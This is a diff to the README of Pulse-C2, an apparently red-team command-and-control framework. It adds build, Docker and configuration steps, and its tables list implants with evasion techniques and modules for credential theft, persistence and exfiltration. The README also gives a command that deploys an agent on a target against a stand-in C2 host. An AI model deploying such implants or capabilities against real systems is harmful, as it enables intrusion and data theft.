@@ -4,7 +4,7 @@
 
 ### *Enterprise Command & Control Platform*
 
-[![Go Version](https://img.shields.io/badge/Go-1.22+-00ADD8?style=for-the-badge&logo=go&logoColor=white)](https://golang.org/)
+[![Go Version](https://img.shields.io/badge/Go-1.25+-00ADD8?style=for-the-badge&logo=go&logoColor=white)](https://golang.org/)
 [![Vue 3](https://img.shields.io/badge/Vue_3-4FC08D?style=for-the-badge&logo=vue.js&logoColor=white)](https://vuejs.org/)
 [![License](https://img.shields.io/badge/License-MIT-FF6B35?style=for-the-badge)](LICENSE)
 [![Build](https://img.shields.io/badge/Build-Passing-28A745?style=for-the-badge&logo=github-actions&logoColor=white)]()
@@ -33,15 +33,15 @@
 graph TB
     Client[Implant/Agent - Windows/Linux/macOS]
     Proxy[SOCKS5 Proxy]
-    Server[C2 Server - Go/TLS+gRPC+REST]
-    DB[PostgreSQL - Telemetry + Config]
+    Server[C2 Server - Go/TLS + REST + WebSocket]
+    DB[(SQLite / PostgreSQL)]
     FS[File Storage - Exfil + Payloads]
-    UI[Web UI - Vue 3/Dashboard + Terminal]
-    CLI[CLI Client - Scripting + Automation]
+    UI[Web UI - Vue 3 / Vite]
+    CLI[CLI Client + Builder]
 
     Client <-->|Encrypted Tunnel - X25519+XChaCha20| Server
+    Client -.->|WebRTC (Pion)| Server
     Server <-->|REST API + WebSocket| UI
-    Server <-->|gRPC Stream| CLI
     Proxy <-->|SOCKS5 via C2 Relay| Server
     Server --> DB
     Server --> FS
@@ -61,7 +61,8 @@ graph TB
 | 📊 **Vue 3 Dashboard** | Dark-themed reactive UI with real-time WebSocket updates |
 | 🔌 **Modular Payload System** | Plugin-based modules for credential theft, persistence, discovery |
 | 📁 **File Exfiltration** | Chunked encrypted file transfers with resume support |
-| 🧪 **Extensible API** | gRPC + REST APIs for custom integrations and automation |
+| 🌐 **WebRTC Channels** | P2P communication via Pion WebRTC for NAT traversal |
+| 🧪 **Extensible API** | REST APIs + Protobuf serialization for custom integrations |
 | 📝 **Full Audit Logging** | Every command and response logged with timestamps and agent ID |
 
 ---
@@ -70,9 +71,9 @@ graph TB
 
 ### Prerequisites
 
-- Go 1.22+
-- Node.js 18+ & npm
-- PostgreSQL 14+
+- **Go** 1.25+ ([install](https://go.dev/dl/))
+- **Node.js** 18+ & npm
+- **SQLite** (built-in, zero config) or **PostgreSQL** 14+ (optional)
 
 ### Clone & Build
 
@@ -81,33 +82,83 @@ git clone https://github.com/Ruby570bocadito/Pulse-C2.git
 cd Pulse-C2
 
 # Build C2 server
-cd server && go build -o pulse-server .
+cd src/go && go build -o ../../dist/pulse-server ./cmd/server
 
 # Build agent/implant
-cd agent && go build -o pulse-agent .
+go build -o ../../dist/pulse-agent ./cmd/agent
 
-# Setup Web UI
-cd ui && npm install && npm run build
+# Build payload builder
+go build -o ../../dist/pulse-builder ./cmd/builder
+
+# Setup Web UI (Vue 3 + Vite)
+cd ../../web && npm install && npm run build
+```
+
+### Configure
+
+```bash
+# Edit config.yaml (SQLite by default, zero config)
+# Or use a custom config:
+cp config.example.yaml my-config.yaml
+# Edit my-config.yaml to your needs
 ```
 
 ### Run
 
 ```bash
-# 1. Start PostgreSQL and create database
-createdb pulse_c2
+# 1. Launch C2 server (SQLite by default — no DB setup needed)
+./dist/pulse-server --config config.yaml
 
-# 2. Configure environment
-export C2_DB_DSN="postgres://user:pass@localhost:5432/pulse_c2"
-export C2_SERVER_KEY="<hex-encoded-x25519-private-key>"
+# 2. Start Web UI (dev mode)
+cd web && npm run dev
 
-# 3. Launch C2 server
-./server/pulse-server --port 8443 --tls-cert server.crt --tls-key server.key
+# 3. Deploy agent on target
+./dist/pulse-agent --server https://c2.example.com:8443 --interval 5
+```
 
-# 4. Start Web UI (dev mode)
-cd ui && npm run dev
+### Docker
 
-# 5. Deploy agent on target
-./agent/pulse-agent --server https://c2.example.com:8443 --interval 5
+```bash
+# Build and run everything with Docker Compose
+docker compose up --build
+
+# Or build individual images:
+docker build -t pulse-c2-server -f Dockerfile .
+docker build -t pulse-c2-agent -f Dockerfile.agent .
+```
+
+---
+
+## 📦 Project Structure
+
+```
+Pulse-C2/
+├── src/
+│   ├── go/
+│   │   ├── cmd/
+│   │   │   ├── server/         # C2 server entrypoint
+│   │   │   ├── agent/          # Implant/agent entrypoint
+│   │   │   └── builder/        # Payload builder
+│   │   ├── internal/           # Shared packages (crypto, protocol, etc.)
+│   │   └── go.mod
+│   └── agents/                 # Agent-specific code (per-platform)
+├── web/                        # Vue 3 + Vite frontend
+│   ├── src/                    # Vue components
+│   └── package.json
+├── api/                        # API definitions / Protobuf specs
+├── modules/                    # Plugins & payload modules
+├── payloads/                   # Pre-built payloads
+├── docs/                       # Documentation
+├── tests/                      # Integration tests
+├── scripts/                    # Automation scripts
+├── dist/                       # Build output
+├── config.yaml                 # Default configuration
+├── config.example.yaml         # Example configuration
+├── Dockerfile                  # Server docker image
+├── Dockerfile.agent            # Agent docker image
+├── docker-compose.yml          # Multi-service deployment
+├── Makefile
+└── CHANGELOG.md
 ```
 
 ---
@@ -116,12 +167,14 @@ cd ui && npm run dev
 
 | Agent / Module | Architecture | Protocol | Evasion | Purpose |
 |----------------|-------------|----------|---------|---------|
-| 🟢 **Pulse-Beacon** | Windows x64 | HTTPS + gRPC | Sleep masking, API unhooking | Long-term persistence & beaconing |
+| 🟢 **Pulse-Beacon** | Windows x64 | HTTPS + Protobuf | Sleep masking, API unhooking | Long-term persistence & beaconing |
 | 🔵 **Pulse-Shell** | Linux x64 | WebSocket | Process hollowing | Interactive shell access |
 | 🟣 **Pulse-Tunnel** | Cross-platform | SOCKS5 via C2 | Traffic obfuscation | Proxy/lateral movement |
-| 🟠 **Pulse-Gather** | Cross-platform | gRPC stream | — | Host recon & data collection |
+| 🟠 **Pulse-Gather** | Cross-platform | Protobuf stream | — | Host recon & data collection |
 | 🔴 **Pulse-Priv** | Windows x64 | Named pipe | Token manipulation | Privilege escalation |
 | ⚪ **Pulse-Kill** | Windows/Linux | One-shot | Timestamp stomping | Process termination & cleanup |
+
+> **Note:** Agent binaries are compiled via `cmd/builder` which embeds the appropriate agent type and configuration.
 
 ---
 
@@ -134,7 +187,51 @@ Pulse-C2 uses **modern AEAD encryption** for all agent-to-server communications:
 | 🔑 **Key Exchange** | X25519 ECDH | Ephemeral session key agreement |
 | 🔐 **Encryption** | XChaCha20-Poly1305 | Authenticated symmetric encryption |
 | 📜 **Certificate** | TLS 1.3 (mTLS optional) | Transport layer security |
-| 🧂 **Nonce**| 192-bit random (XChaCha20) | Per-message uniqueness |
+| 🧂 **Nonce** | 192-bit random (XChaCha20) | Per-message uniqueness |
+
+---
+
+## ⚙️ Configuration
+
+```yaml
+# config.yaml
+server:
+  host: "0.0.0.0"
+  port: 8443
+  max_sessions: 5000
+  heartbeat_interval: 30s
+  session_timeout: 300s
+
+database:
+  driver: "sqlite"          # or "postgres"
+  dsn: "bty.db"             # or "postgres://user:pass@localhost:5432/pulse_c2"
+
+tls:
+  enabled: true
+  auto_cert: true           # Let's Encrypt auto certs
+  cert_file: ""
+  key_file: ""
+
+transport:
+  http_port: 8445
+  ws_port: 8446
+  dns_port: 0
+```
+
+---
+
+## 🧪 Development
+
+```bash
+# Run tests
+cd src/go && go test ./...
+
+# Lint
+golangci-lint run ./src/go/...
+
+# Build all (using Makefile)
+make build-all
+```
 
 ---
 
@@ -151,22 +248,6 @@ Pulse-C2 uses **modern AEAD encryption** for all agent-to-server communications:
 │ ghi789   │ macOS    │ 🟡 Idle   │ 2h 05m   │  45s ago        │
 │ jkl012   │ Windows  │ 🔴 Dead   │ —        │  3h ago         │
 └──────────┴──────────┴──────────┴──────────┴─────────────────┘
-```
-
----
-
-## 🧪 Development
-
-```bash
-# Run tests
-cd server && go test ./...
-cd agent && go test ./...
-
-# Lint
-golangci-lint run ./...
-
-# Build all
-make build-all
 ```
 
 ---
@@ -195,7 +276,7 @@ Distributed under the **MIT License**. See [LICENSE](LICENSE) for details.
 
 Built with ⚡ for professional red teams
 
-[Report Bug](https://github.com/Ruby570bocadito/Pulse-C2/issues) · [Request Feature](https://github.com/Ruby570bocadito/Pulse-C2/issues) · [Documentation](https://github.com/Ruby570bocadito/Pulse-C2)
+[Report Bug](https://github.com/Ruby570bocadito/Pulse-C2/issues) · [Request Feature](https://github.com/Ruby570bocadito/Pulse-C2/issues)
 
 ---
 
